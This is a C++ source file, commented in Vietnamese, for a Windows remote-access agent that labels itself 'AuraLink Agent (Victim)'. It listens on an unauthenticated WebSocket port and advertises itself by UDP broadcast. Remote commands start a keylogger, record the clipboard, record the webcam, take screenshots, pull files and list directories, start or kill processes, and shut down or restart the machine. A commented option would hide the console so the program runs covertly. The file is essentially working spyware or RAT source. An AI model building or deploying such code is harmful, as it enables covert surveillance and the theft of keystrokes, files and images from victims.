// --- CAU HINH WINDOWS ---
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 
#endif

#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/ip/udp.hpp> 
#include <boost/asio/strand.hpp>
#include <cstdlib>      
#include <iostream>
#include <string>
#include <thread>
#include <memory>
#include <vector>
#include <fstream>
#include <windows.h>   
#include <iphlpapi.h>
#include <atomic> 
#include <iomanip>
#include <chrono> 

// Cac module chuc nang 
#include "Process.h"
#include "Keylogger.h"
#include "Webcam.h"
#include "Application.h"
#include "ScreenShot.h"
#include "TextToSpeech.h"
#include "Clipboard.h"
#include "FileTransfer.h"

// Link thu vien Windows
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib") 
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")

namespace beast = boost::beast;
namespace http = beast::http;
namespace websocket = beast::websocket;
namespace net = boost::asio;
using tcp = boost::asio::ip::tcp;
using udp = boost::asio::ip::udp; // [MỚI]

// =============================================================
// PHAN 1: CAC HAM HO TRO (LIVE STATUS & RESOURCES)
// =============================================================

static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Hàm mã hóa Base64
std::string base64_encode(const std::vector<char>& data) {
    std::string ret;
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];
    size_t dataLen = data.size();
    size_t dataPos = 0;
    while (dataLen--) {
        char_array_3[i++] = data[dataPos++];
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; (i < 4); i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
        while ((i++ < 3)) ret += '=';
    }
    return ret;
}

// Các hàm lấy thông tin hệ thống
std::string GetComputerNameStr() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) return std::string(buffer);
    return "Unknown-PC";
}

std::string GetOSVersionStr() {
    std::string osName = "Unknown Windows";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char productName[255] = { 0 };
        DWORD dataSize = sizeof(productName);
        if (RegQueryValueExA(hKey, "ProductName", nullptr, nullptr, (LPBYTE)productName, &dataSize) == ERROR_SUCCESS) {
            osName = std::string(productName);
        }
        RegCloseKey(hKey);
    }
    return osName;
}

std::string GetRamFree() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    double freeGB = (double)statex.ullAvailPhys / (1024 * 1024 * 1024);
    std::stringstream ss;
    ss << std::fixed << std::setprecision(1) << freeGB << " GB";
    return ss.str();
}

std::string GetRamUsagePercent() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    return std::to_string((int)statex.dwMemoryLoad);
}

std::string GetDiskFree() {
    ULARGE_INTEGER freeBytes, totalBytes, totalFree;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, &totalFree)) {
        double freeGB = (double)freeBytes.QuadPart / (1024 * 1024 * 1024);
        std::stringstream ss;
        ss << std::fixed << std::setprecision(0) << freeGB << " GB";
        return ss.str();
    }
    return "Unknown";
}

std::string GetProcessCount() {
    DWORD count = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do { count++; } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return std::to_string(count);
}

std::string GetCpuUsage() {
    FILETIME idleTime, kernelTime, userTime;
    if (!GetSystemTimes(&idleTime, &kernelTime, &userTime)) return "0";

    static unsigned long long prevTotal = 0;
    static unsigned long long prevIdle = 0;

    unsigned long long total =
        ((unsigned long long)kernelTime.dwHighDateTime << 32 | kernelTime.dwLowDateTime) +
        ((unsigned long long)userTime.dwHighDateTime << 32 | userTime.dwLowDateTime);

    unsigned long long idle =
        ((unsigned long long)idleTime.dwHighDateTime << 32 | idleTime.dwLowDateTime);

    unsigned long long diffTotal = total - prevTotal;
    unsigned long long diffIdle = idle - prevIdle;

    prevTotal = total;
    prevIdle = idle;

    if (diffTotal == 0) return "0";
    double usage = (100.0 * (diffTotal - diffIdle)) / diffTotal;
    if (usage < 0) usage = 0; if (usage > 100) usage = 100;

    return std::to_string((int)usage);
}

std::string GetBatteryStatus() {
    SYSTEM_POWER_STATUS sps;
    if (GetSystemPowerStatus(&sps)) {
        if (sps.BatteryLifePercent == 255) return "Plugged In";
        return std::to_string(sps.BatteryLifePercent) + "%";
    }
    return "Unknown";
}

void DoShutdown();
void DoRestart();
std::thread g_webcamThread;
void fail(beast::error_code ec, char const* what) { std::cerr << what << ": " << ec.message() << "\n"; }

// =============================================================
// AUTO DISCOVERY BROADCASTER (UDP)
// =============================================================

// Hàm này chạy trên thread riêng, liên tục gửi tín hiệu "Tôi ở đây"
void UDP_Broadcaster_Thread(int targetPort, int myWsPort) {
    try {
        net::io_context ioc;
        udp::socket socket(ioc);
        socket.open(udp::v4());
        socket.set_option(udp::socket::broadcast(true)); // Cho phép gửi Broadcast

        // Địa chỉ broadcast toàn mạng (255.255.255.255)
        udp::endpoint broadcast_endpoint(net::ip::address_v4::broadcast(), targetPort);

        std::string myName = GetComputerNameStr();
        std::string myOS = GetOSVersionStr();
        // ID đơn giản là tên máy (hoặc bạn có thể dùng MAC address nếu muốn duy nhất hơn)
        std::string myID = "ID-" + myName;

        std::cout << "[UDP] Started broadcasting discovery signal to port " << targetPort << "...\n";

        while (true) {
            // Cấu trúc gói tin: REGISTER|ID|Name|OS|Port
            std::string msg = "REGISTER|" + myID + "|" + myName + "|" + myOS + "|" + std::to_string(myWsPort);

            boost::system::error_code ec;
            socket.send_to(net::buffer(msg), broadcast_endpoint, 0, ec);

            if (ec) {
                std::cerr << "[UDP Error] Broadcast failed: " << ec.message() << "\n";
            }

            // Gửi mỗi 5 giây một lần
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }
    catch (std::exception& e) {
        std::cerr << "[UDP Critical Error]: " << e.what() << "\n";
    }
}

// =============================================================
// PHAN 2: XU LY KET NOI (SESSION) 
// =============================================================

class session : public std::enable_shared_from_this<session> {
    websocket::stream<beast::tcp_stream> ws_;
    beast::flat_buffer buffer_;

    // [FIX] Thêm hàng đợi để lưu các tin nhắn chưa gửi kịp
    std::vector<std::shared_ptr<std::string>> queue_;

public:
    explicit session(tcp::socket&& socket) : ws_(std::move(socket)) {}

    void run() {
        // Cấu hình Timeout
        ws_.set_option(websocket::stream_base::timeout::suggested(beast::role_type::server));
        ws_.async_accept(beast::bind_front_handler(&session::on_accept, shared_from_this()));
    }

    void on_accept(beast::error_code ec) {
        if (ec) return fail(ec, "Accept Error");
        do_read();
    }

    // --- HÀM SEND ĐÃ ĐƯỢC NÂNG CẤP ---
    void send(std::string msg) {
        auto self = shared_from_this();
        auto msg_ptr = std::make_shared<std::string>(std::move(msg));

        // Đẩy việc xử lý vào luồng chính (Executor)
        net::post(ws_.get_executor(), [self, msg_ptr]() {
            if (!self->ws_.is_open()) return;

            // 1. Thêm tin nhắn vào hàng đợi
            self->queue_.push_back(msg_ptr);

            // 2. Nếu hàng đợi có nhiều hơn 1 tin nhắn, nghĩa là đang có 
            // một tin nhắn khác đang được gửi (async_write chưa xong).
            // Ta chỉ cần return, tin nhắn này sẽ được xử lý sau.
            if (self->queue_.size() > 1) {
                return;
            }

            // 3. Nếu hàng đợi chỉ có mình nó, bắt đầu gửi ngay
            self->do_write();
            });
    }

    // [FIX] Hàm thực hiện việc ghi dữ liệu (được gọi nội bộ)
    void do_write() {
        if (queue_.empty()) return;

        // Lấy tin nhắn đầu hàng đợi ra để gửi
        auto const& msg_ptr = queue_.front();

        ws_.text(true);
        ws_.async_write(net::buffer(*msg_ptr),
            beast::bind_front_handler(&session::on_write, shared_from_this()));
    }

    void do_read() {
        ws_.async_read(buffer_, beast::bind_front_handler(&session::on_read, shared_from_this()));
    }

    void on_write(beast::error_code ec, std::size_t bytes_transferred) {
        boost::ignore_unused(bytes_transferred);

        if (ec) {
            std::cerr << "Write Error: " << ec.message() << "\n";
            queue_.clear(); // Nếu lỗi thì xóa hết hàng đợi
            return;
        }

        // 1. Xóa tin nhắn đã gửi xong khỏi hàng đợi
        queue_.erase(queue_.begin());

        // 2. Nếu còn tin nhắn trong hàng đợi, tiếp tục gửi tin tiếp theo
        if (!queue_.empty()) {
            do_write();
        }
    }

    void on_read(beast::error_code ec, std::size_t bytes_transferred) {
        boost::ignore_unused(bytes_transferred);
        if (ec == websocket::error::closed) return;
        if (ec) return fail(ec, "Read Error");

        if (ws_.got_text()) {
            std::string command = beast::buffers_to_string(buffer_.data());

            // Xử lý lệnh trong block try-catch để server không bao giờ bị crash
            try {
                // Khai báo các module static để dùng chung
                static Keylogger myKeylogger;
                static Process myProcessModule;
                static Application myAppModule;
                static Clipboard myClipboard;

                // --- XỬ LÝ LỆNH ---

                if (command == "get-sys-info") {
                    // Lấy thông tin hệ thống
                    std::string sysInfo = "sys-info " + GetComputerNameStr() + "|" +
                        GetOSVersionStr() + "|" + GetRamFree() + "|" +
                        GetBatteryStatus() + "|" + GetDiskFree() + "|" +
                        GetProcessCount() + "|" + GetCpuUsage() + "|" +
                        GetRamUsagePercent();
                    send(sysInfo);
                }
                else if (command == "ping") {
                    send("pong");
                }
                else if (command == "shutdown") {
                    send("Server: OK, shutting down...");
                    DoShutdown();
                }
                else if (command == "restart") {
                    send("Server: OK, restarting...");
                    DoRestart();
                }
                else if (command == "capture") {
                    if (g_webcamThread.joinable()) {
                        send("Server: Busy recording...");
                    }
                    else {
                        send("Server: Started recording...");
                        auto self = shared_from_this();
                        // Chạy luồng riêng để quay phim
                        g_webcamThread = std::thread([self]() {
                            std::vector<char> videoData = CaptureWebcam(10); // Quay 10 giây
                            if (!videoData.empty()) {
                                std::string encoded = base64_encode(videoData);
                                // Gọi hàm send() mới -> Nó sẽ tự dùng net::post để an toàn
                                self->send("file " + encoded);
                            }
                            else {
                                self->send("Server: Webcam capture failed/empty.");
                            }
                            });
                        g_webcamThread.detach();
                    }
                }
                else if (command == "screenshot") {
                    int width = GetSystemMetrics(SM_CXSCREEN);
                    int height = GetSystemMetrics(SM_CYSCREEN);
                    std::vector<std::uint8_t> pixels = ScreenShot();
                    if (pixels.empty()) {
                        send("Server: Error capturing screenshot.");
                    }
                    else {
                        std::vector<char> bytes(pixels.begin(), pixels.end());
                        std::string encoded = base64_encode(bytes);
                        send("screenshot " + std::to_string(width) + " " + std::to_string(height) + " " + encoded);
                    }
                }
                else if (command == "start-keylog") {
                    myKeylogger.StartKeyLogging();
                    send("Server: Keylogger started...");
                }
                else if (command == "stop-keylog") {
                    myKeylogger.StopKeyLogging();
                    send("Server: Keylogger stopped.");
                }
                else if (command == "get-keylog") {
                    std::string logs = myKeylogger.GetLoggedKeys();
                    send(logs);
                }
                else if (command == "ps") {
                    std::string list = myProcessModule.ListProcesses();
                    send(list);
                }
                else if (command.rfind("start ", 0) == 0) {
                    std::string appName = command.substr(6);
                    if (myProcessModule.StartProcess(appName)) send("Server: Started: " + appName);
                    else send("Server: Error starting: " + appName);
                }
                else if (command.rfind("kill ", 0) == 0) {
                    std::string target = command.substr(5);
                    std::string result = myProcessModule.StopProcess(target);
                    send("Server: " + result);
                }
                else if (command == "list-app") {
                    myAppModule.LoadInstalledApps();
                    auto apps = myAppModule.ListApplicationsWithStatus();
                    if (apps.empty()) { send("Server: No apps found."); }
                    else {
                        std::string msg = "DANH SACH UNG DUNG\n";
                        for (size_t i = 0; i < apps.size(); ++i) {
                            msg += "[" + std::to_string(i) + "] " + apps[i].first.name + (apps[i].second ? " (RUNNING)" : "") + "\n";
                            msg += "Exe: " + apps[i].first.path + "\n";
                        }
                        send(msg);
                    }
                }
                else if (command.rfind("start-app ", 0) == 0) {
                    std::string input = command.substr(10);
                    bool ok = myAppModule.StartApplication(input);
                    send(ok ? "Server: Started " + input : "Server: Failed " + input);
                }
                else if (command.rfind("stop-app ", 0) == 0) {
                    std::string input = command.substr(9);
                    bool ok = myAppModule.StopApplication(input);
                    send(ok ? "Server: Stopped " + input : "Server: Failed stop " + input);
                }
                else if (command.rfind("tts ", 0) == 0) {
                    std::string textToSpeak = command.substr(4);
                    static TextToSpeech myTTS;
                    myTTS.Speak(textToSpeak);
                    send("Server: OK, speaking...");
                }
                else if (command == "start-clip") {
                    myClipboard.StartMonitoring();
                    send("Server: Clipboard Monitor STARTED...");
                }
                else if (command == "stop-clip") {
                    myClipboard.StopMonitoring();
                    send("Server: Clipboard Monitor STOPPED.");
                }
                else if (command == "get-clip") {
                    std::string logs = myClipboard.GetLogs();
                    if (logs.empty()) logs = "[No clipboard data]";
                    send("CLIPBOARD_DATA:\n" + logs);
                }
                else if (command.rfind("download-file ", 0) == 0) {
                    std::string filepath = command.substr(14);
                    // Trim spaces
                    filepath.erase(0, filepath.find_first_not_of(" \n\r\t"));
                    filepath.erase(filepath.find_last_not_of(" \n\r\t") + 1);
                    std::string response = FileTransfer::HandleDownloadRequest(filepath);
                    send(response);
                }
                else if (command.rfind("ls ", 0) == 0) {
                    std::string path = command.substr(3);
                    std::string result = FileTransfer::ListDirectory(path);
                    send(result);
                }
                else if (command == "ls") {
                    std::string result = FileTransfer::ListDirectory("C:\\");
                    send(result);
                }
            }
            catch (const std::exception& e) {
                std::cerr << "Command Processing Error: " << e.what() << "\n";
                // Không gửi lại lỗi để tránh vòng lặp, chỉ log ra console server
            }
        }

        buffer_.consume(buffer_.size());
        do_read();
    }
};

class listener : public std::enable_shared_from_this<listener> {
    net::io_context& ioc_;
    tcp::acceptor acceptor_;
public:
    listener(net::io_context& ioc, tcp::endpoint endpoint) : ioc_(ioc), acceptor_(ioc) {
        beast::error_code ec;
        acceptor_.open(endpoint.protocol(), ec);
        if (ec) { fail(ec, "Open Error"); return; }
        acceptor_.set_option(net::socket_base::reuse_address(true), ec);
        if (ec) { fail(ec, "Set Option Error"); return; }
        acceptor_.bind(endpoint, ec);
        if (ec) { fail(ec, "Bind Error"); return; }
        acceptor_.listen(net::socket_base::max_listen_connections, ec);
        if (ec) { fail(ec, "Listen Error"); return; }
    }
    void run() { do_accept(); }
private:
    void do_accept() { acceptor_.async_accept(net::make_strand(ioc_), beast::bind_front_handler(&listener::on_accept, shared_from_this())); }
    void on_accept(beast::error_code ec, tcp::socket socket) {
        if (ec) fail(ec, "Accept Error");
        else std::make_shared<session>(std::move(socket))->run();
        do_accept();
    }
};

// =============================================================
// MAIN FUNCTION
// =============================================================

int main() {
    // Ẩn cửa sổ Console nếu muốn chạy ngầm hoàn toàn (bỏ comment nếu cần)
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    SetProcessDPIAware();

    auto const address = net::ip::make_address("0.0.0.0");
    unsigned short ws_port = 8080;  // Cổng WebSocket của Victim
    unsigned short udp_port = 8081; // Cổng UDP của Registry Server (để gửi tới)
    int threads = 1;

    std::cout << "Starting AuraLink Agent (Victim)...\n";
    std::cout << "WS Listening on port: " << ws_port << "\n";
    std::cout << "Discovery Broadcasting to UDP port: " << udp_port << "\n";
    std::cout << "----------------------------------\n";

    // 1. Khởi động luồng UDP Broadcaster (Chạy ngầm)
    // Gửi tín hiệu đến Registry Server (port 8081) báo rằng "Tôi đang chạy ở cổng 8080"
    std::thread broadcaster(UDP_Broadcaster_Thread, udp_port, ws_port);
    broadcaster.detach();

    // 2. Khởi động WebSocket Server (Chờ kết nối trực tiếp từ Web Client)
    net::io_context ioc{ threads };
    std::make_shared<listener>(ioc, tcp::endpoint{ address, ws_port })->run();
    ioc.run();

    return EXIT_SUCCESS;
}